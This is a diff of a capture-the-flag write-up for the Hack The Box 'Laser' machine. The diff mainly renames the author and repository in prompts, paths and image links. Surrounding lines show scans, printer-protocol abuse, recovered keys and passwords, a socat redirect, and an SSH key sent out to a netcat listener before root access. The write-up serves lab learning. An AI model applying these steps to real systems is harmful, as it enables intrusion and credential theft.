@@ -9,6 +9,7 @@ avatar: assets/htb/laser.png
 source: https://github.com/zweilosec/htb-writeups (MIT)
 htb_url: https://app.hackthebox.com/machines/Laser
 ---
+
 ## Overview
 
 This Insane-difficulty machine from [Hack The Box](https://www.linkedin.com/company/hackthebox/) took me a lot longer to progress to the initial foothold than most boxes take to root!  This machine had some very interesting avenues of approach that greatly differed from the standard enumeration and progression that most of the lower difficulty machines require. I had to research new protocols just to begin, and by the end had to write five python scripts to progress through the initial foothold and for later privilege escalation.  All in all it was a fun, but very challenging ride!
@@ -30,7 +31,7 @@ This Insane-difficulty machine from [Hack The Box](https://www.linkedin.com/comp
 I started my enumeration with an nmap scan of `<YOUR_IP>`. The options I regularly use are: `-p-`, which is a shortcut which tells nmap to scan all ports, `-sC` is the equivalent to `--script=default` and runs a collection of nmap enumeration scripts against the target, `-sV` does a service scan, and `-oA <name>` saves the output with a filename of `<name>`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ nmap -sCV -n -v -p- -oA laser <YOUR_IP>                
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 15:31 EST
 NSE: Loaded 153 scripts for scanning.
@@ -121,12 +122,12 @@ The Nmap scan only showed three open ports: 22 - SSH, 9000, and 9001. I wasn't f
 
 ### Port 9000 & 9001
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/1-9000.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/1-9000.png)
 
 First I tried firing up a browser to see what kind of reply I might get from these ports.  9001 did not respond at all, while 9000 just sent back garbage characters \(probably binary information\).
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ telnet <YOUR_IP> 9100
 Trying <YOUR_IP>...
 Connected to <YOUR_IP>.
@@ -151,7 +152,7 @@ Next, I connected with telnet but everything I sent just got back the reply `?`.
 One of the sources pointed out that if you can access a printer and also SNMP, then the system is pretty much yours already.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ sudo nmap -sU -p161 --reason <YOUR_IP>
 sudo: unable to resolve host kali: Name or service not known
 Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-21 16:24 EST
@@ -173,7 +174,7 @@ After searching a bit more I came across a nice toolkit someone had put together
 [https://github.com/RUB-NDS/PRET](https://github.com/RUB-NDS/PRET)
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser/PRET]
+┌──(kac0㉿kali)-[~/htb/laser/PRET]
 └─$ python pret.py -o laser.pret <YOUR_IP> ps                                                    1 ⨯
       ________________                                             
     _/_______________/|                                            
@@ -203,7 +204,7 @@ Connection to <YOUR_IP> established
 Unknown command: 'test'
 <YOUR_IP>:/> 
 
-┌──(zweilos㉿kali)-[~/htb/laser/PRET]
+┌──(kac0㉿kali)-[~/htb/laser/PRET]
 └─$ python pret.py -o laser.pret <YOUR_IP> pcl
       ________________                                             
     _/_______________/|                                            
@@ -249,7 +250,7 @@ Trying the `ls` command gave me an error message that said I could use `put` to 
 After reading up about the difference between the printer languages I decided that this one probably didn't speak the binary language of vaporators...I mean PCL.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser/PRET]
+┌──(kac0㉿kali)-[~/htb/laser/PRET]
 └─$ python pret.py -o laser.pret <YOUR_IP> pjl
       ________________                                             
     _/_______________/|                                            
@@ -315,7 +316,7 @@ I made the mistake of **`cat`**-ing the **`queued`** file at first. Don't do thi
 **Use `get`**.  This will nicely download the file to your local machine.  However, when I opened the file it was still a wall of base64 encoded text so I tried to decode it.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser/PRET]
+┌──(kac0㉿kali)-[~/htb/laser/PRET]
 └─$ echo queued | base64 -d > queued.decoded
 base64: invalid input
 ```
@@ -611,7 +612,7 @@ The `info` command seemed to give pretty much the same information as some of th
 Creating mirror of /
 Traversing pjl/
 Traversing pjl/jobs/
-0:/pjl/jobs/queued -> /home/zweilos/htb/laser/PRET/mirror/<YOUR_IP>/0/pjl/jobs/queued
+0:/pjl/jobs/queued -> /home/kac0/htb/laser/PRET/mirror/<YOUR_IP>/0/pjl/jobs/queued
 172199 bytes received.
 ```
 
@@ -632,7 +633,7 @@ Writing copy to nvram/<YOUR_IP>
 
 The `nvram` command had a dump operation which gave me what looked to be a possible encryption key. 
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/3-nvram-key-capture.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/3-nvram-key-capture.png)
 
 I wasn't sure that the output was showing everything I needed so I started Wireshark and did a packet capture to see what other data was being dumped.
 
@@ -659,7 +660,7 @@ DATA = 117
 
 I got the above data points back from the capture.  They looked like decimal encoded characters to me.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/4-nvram-key-capture-decode.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/4-nvram-key-capture-decode.png)
 
 The key was decimal encoded, so I used CyberChef to decode it and got the key `13vu94r6643rv19u`. For some reason the console output didn't decode it properly from the `nvram` command. \(I'm also not sure what the `46` characters were in the middle of the two halves, but they weren't needed. Some sort of delimiter for the two halves?\)
 
@@ -710,14 +711,14 @@ I wrote a simple python script to decode the `queued` file after I stripped out 
 ### The PDF document
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ file q-out                                                                                      2 ⨯
 q-out: PDF document, version 1.4
 ```
 
 The file that was in the print queue turned out to be a PDF document.
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/2-q-ou1.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/2-q-ou1.png)
 
 ```text
 Description
@@ -823,7 +824,7 @@ string feed = 1;
 Using this information, and the information from the PDF document I recovered, I created the above `.proto` file to tell the grpc client how to communicate with this particular service.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$python3 -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. laser.proto
 ```
 
@@ -851,7 +852,7 @@ test()
 I then created a python client `grpc_client.py` to connect to port 9000 on the server and send my request. I set the feed URL to be my machine to test the connection.  Next I created a netcat listener to catch the return message.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ nc -lvnp 8099                                 
 listening on [any] 8099 ...
 connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 55426
@@ -871,16 +872,16 @@ return service_pb2.Data(feed='Pushing feeds')
 The PDF mentioned that I should get back the message `'Pushing feeds'`, but I did not get any messages back at all.  
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ python3 grpc_client.py                                                                          1 ⨯
 Traceback (most recent call last):
   File "grpc_client.py", line 15, in <module>
     test()
   File "grpc_client.py", line 12, in run
     response = stub.Feed(laser_pb2.Content(data=enc_message))
-  File "/home/zweilos/.local/lib/python3.8/site-packages/grpc/_channel.py", line 923, in __call__
+  File "/home/kac0/.local/lib/python3.8/site-packages/grpc/_channel.py", line 923, in __call__
     return _end_unary_response_blocking(state, call, False, None)
-  File "/home/zweilos/.local/lib/python3.8/site-packages/grpc/_channel.py", line 826, in _end_unary_response_blocking
+  File "/home/kac0/.local/lib/python3.8/site-packages/grpc/_channel.py", line 826, in _end_unary_response_blocking
     raise _InactiveRpcError(state)
 grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
         status = StatusCode.UNKNOWN
@@ -892,7 +893,7 @@ grpc._channel._InactiveRpcError: <_InactiveRpcError of RPC that terminated with:
 While doing some testing I forgot to start my listener, and got the above error message back since my computer refused the connection.  The verbose error message came in handy later.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ python3 grpc_client.py
 Exception calling application: (6, 'Could not resolve host: printer.laserinternal.htb')
 ```
@@ -900,7 +901,7 @@ Exception calling application: (6, 'Could not resolve host: printer.laserinterna
 After redirecting the target to be the internal machine I got an error message with a new hostname.  I added this to my `/etc/hosts` file.  Sending the traffic to this hostname did not resolve my connection errors.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ ping printer.laserinternal.htb               
 PING printer.laserinternal.htb (<YOUR_IP>) 56(84) bytes of data.
 64 bytes from printer.laserinternal.htb (<YOUR_IP>): icmp_seq=1 ttl=63 time=40.9 ms
@@ -969,7 +970,7 @@ I did find a good example of how to do a multi-threaded port scanner at [https:/
 {% endhint %}
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ python3 grpc_scan.py
 Port 22 open!
 Exception calling application: (1, 'Received HTTP/0.9 when not allowed\n')
@@ -1056,7 +1057,7 @@ After a lot of trial and error, I got my code to work and set up a netcat listen
 ## Initial Foothold
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ nc -lvnp 8099
 listening on [any] 8099 ...
 connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 36790
@@ -1127,7 +1128,7 @@ drwxr-xr-x 3 root root 4096 Jun 29 06:55 ..
 drwxr-xr-x 4 solr solr 4096 Jun 19  2020 feed_engine
 -r-------- 1 solr solr   33 Dec 18 05:49 user.txt
 solr@laser:/home/solr$ cat user.txt 
-1cc8****c762
+1cc8************************c762
 ```
 
 The file `user.txt` was in `/home/solr` as expected, however I was confused at first since this was not the user's home directory.
@@ -1137,7 +1138,7 @@ The file `user.txt` was in `/home/solr` as expected, however I was confused at f
 ### Enumeration as `solr`
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ ssh solr@<YOUR_IP> -i solr.key 
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
 
@@ -1314,7 +1315,7 @@ Essentially it seemed as if this program was written to bypass the security of S
 
 I found the code for sshpass on GitHub: [https://github.com/kevinburke/sshpass/blob/master/main.c](https://github.com/kevinburke/sshpass/blob/master/main.c)
 
-![](https://raw.githubusercontent.com/zweilosec/htb-writeups/master/.gitbook/assets/8-sshpass-code.png)
+![](https://raw.githubusercontent.com/kac0/htb-writeups/master/.gitbook/assets/8-sshpass-code.png)
 
 ```c
 // Parse the command line. Fill in the "args" global struct with the results. Return argv offset
@@ -1410,7 +1411,7 @@ static int parse_options( int argc, char *argv[] )
 After analyzing the source code, I found out that the `-p` option takes in the original password from argument input and obfuscates it by replacing each character with a 'z', one character at a time. In the `ps aux` output I got earlier I saw the command `sshpass -p zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz` followed by the SCP command the password was being supplied to.  Since the command is originally input with the password in plaintext, the race condition exists where the plaintext password must be able to be read from memory prior to being obfuscated.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ echo -n zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz | wc -c
 32
 ```
@@ -1453,7 +1454,7 @@ sshpass -p c413d115b3d87664499624e7826d8c5a scp /opt/updates/files/graphql-feed 
 The password was `c413d115b3d87664499624e7826d8c5a`.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ echo -n c413d115b3d87664499624e7826d8c5a | wc -c                                
 32
 ```
@@ -1599,7 +1600,7 @@ root@20e3289bc183:~# ./socat -d TCP-LISTEN:22,fork,reuseaddr TCP:172.17.0.1:22
 The process that would run my malicious `clear.sh` also deleted my file, so I had to keep putting it back in place.  After recreating the script I started the `socat` redirect again.
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ nc -lvnp 9099
 listening on [any] 9099 ...
 connect to [10.10.15.98] from (UNKNOWN) [<YOUR_IP>] 38660
@@ -1649,7 +1650,7 @@ I received the SSH key back at my waiting listener almost immediately after star
 ### Root.txt
 
 ```text
-┌──(zweilos㉿kali)-[~/htb/laser]
+┌──(kac0㉿kali)-[~/htb/laser]
 └─$ ssh root@<YOUR_IP> -i laser.key
 Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-42-generic x86_64)
 
@@ -1678,7 +1679,7 @@ Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your 
 
 Last login: Sat Dec 19 18:36:54 2020 from 10.10.15.98
 root@laser:~# cat root.txt 
-fbc1****64c7
+fbc1************************64c7
 root@laser:~# id && hostname
 uid=0(root) gid=0(root) groups=0(root)
 laser
